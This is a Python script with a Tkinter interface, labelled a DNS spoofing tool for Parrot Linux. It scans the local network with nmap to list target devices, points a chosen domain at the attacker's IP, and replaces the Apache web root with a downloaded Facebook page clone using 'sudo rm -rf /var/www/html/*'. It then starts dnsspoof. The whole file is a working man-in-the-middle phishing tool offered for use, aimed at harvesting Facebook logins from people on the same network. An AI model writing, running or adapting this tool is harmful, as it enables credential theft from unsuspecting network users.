#!/usr/bin/env python3

import os
import subprocess
import tkinter as tk
from tkinter import filedialog
import netifaces
import nmap

class DNS_Spoofing_Tool:
    def __init__(self, root):
        self.root = root
        self.root.title("DNS Spoofing Tool")

        # Label and entry for Parrot Linux IP
        self.parrot_ip_label = tk.Label(root, text="Your IP:")
        self.parrot_ip_label.grid(row=0, column=0, padx=10, pady=5)
        self.parrot_ip_entry = tk.Entry(root)
        self.parrot_ip_entry.grid(row=0, column=1, padx=10, pady=5)

        # Button to scan for available target IPs
        self.scan_button = tk.Button(root, text="Scan for Target IPs", command=self.scan_ips)
        self.scan_button.grid(row=0, column=2, padx=10, pady=5)

        # Label and entry for target domain
        self.target_domain_label = tk.Label(root, text="Target Domain:")
        self.target_domain_label.grid(row=1, column=0, padx=10, pady=5)
        self.target_domain_entry = tk.Entry(root)
        self.target_domain_entry.grid(row=1, column=1, padx=10, pady=5)

        # Dropdown for network interface
        self.interface_label = tk.Label(root, text="Network Interface:")
        self.interface_label.grid(row=2, column=0, padx=10, pady=5)
        self.interfaces = netifaces.interfaces()
        self.interface_var = tk.StringVar(root)
        self.interface_var.set(self.interfaces[0])  # Set default value
        self.interface_dropdown = tk.OptionMenu(root, self.interface_var, *self.interfaces)
        self.interface_dropdown.grid(row=2, column=1, padx=10, pady=5)

        # Label to display available target IPs
        self.target_ips_label = tk.Label(root, text="Available Target IPs:")
        self.target_ips_label.grid(row=3, column=0, padx=10, pady=5)
        self.target_ips_text = tk.Text(root, height=5, width=50)
        self.target_ips_text.grid(row=3, column=1, columnspan=2, padx=10, pady=5)

        # Button to select downloaded Facebook folder
        self.select_folder_button = tk.Button(root, text="Select Downloaded Facebook Folder", command=self.select_folder)
        self.select_folder_button.grid(row=4, column=0, columnspan=2, padx=10, pady=5)

        # Button to start DNS spoofing
        self.start_button = tk.Button(root, text="Start DNS Spoofing", command=self.start_dns_spoofing)
        self.start_button.grid(row=5, column=0, columnspan=2, padx=10, pady=5)

        # Get and display Parrot Linux IP
        self.parrot_ip_entry.insert(0, self.get_parrot_ip())

    def get_parrot_ip(self):
        # Get IP address of the Parrot Linux machine
        for interface in netifaces.interfaces():
            if interface != "lo":
                return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

    def scan_ips(self):
        # Perform a simple network scan to identify other devices on the network
        nm = nmap.PortScanner()
        nm.scan(hosts='192.168.0.0/24', arguments='-sn')
        
        # Display the results in the text field
        for host in nm.all_hosts():
            manufacturer = nm[host]['vendor'].get('mac') if 'vendor' in nm[host] else "Unknown"
            self.target_ips_text.insert(tk.END, f"IP: {host}, Manufacturer: {manufacturer}\n")

    def select_folder(self):
        # Opens file dialog to select downloaded Facebook folder
        self.downloaded_folder = filedialog.askdirectory()

    def start_dns_spoofing(self):
        # Get Parrot Linux IP, target domain, and selected network interface
        parrot_ip = self.parrot_ip_entry.get()
        target_domain = self.target_domain_entry.get()
        selected_interface = self.interface_var.get()

        # Update hosts.txt with Parrot Linux IP and target domain
        hosts_file_path = "/tmp/hosts.txt"
        with open(hosts_file_path, "w") as f:
            f.write(f"{parrot_ip} {target_domain}")

        # Move downloaded Facebook files to Apache's root directory
        if self.downloaded_folder:
            os.system(f"sudo rm -rf /var/www/html/*")
            os.system(f"sudo mv {self.downloaded_folder}/* /var/www/html/")

        # Start DNS spoofing with selected network interface
        subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])

if __name__ == "__main__":
    root = tk.Tk()
    dns_spoofing_tool = DNS_Spoofing_Tool(root)
    root.mainloop()
